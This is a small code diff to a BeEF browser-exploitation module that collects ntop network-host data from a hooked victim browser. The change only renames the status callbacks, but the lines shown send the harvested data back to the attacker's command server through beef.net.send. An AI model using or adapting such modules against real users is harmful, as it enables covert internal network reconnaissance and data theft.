@@ -20,10 +20,10 @@ beef.execute(function() {
     try {
       var result = JSON.stringify(ntopDict);
       beef.debug("[Get ntop Network Hosts] Success: Found ntop data (" + result.length + ' bytes)');
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto=http&ip=<%= @rhost %>&port=<%= @rport %>&data="+result, beef.are.status_success());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto=http&ip=<%= @rhost %>&port=<%= @rport %>&data="+result, beef.status.success());
     } catch(e) {
       beef.debug("[Get ntop Network Hosts] Error: Did not find ntop");
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=did not find ntop', beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=did not find ntop', beef.status.error());
       return;
     }
   }
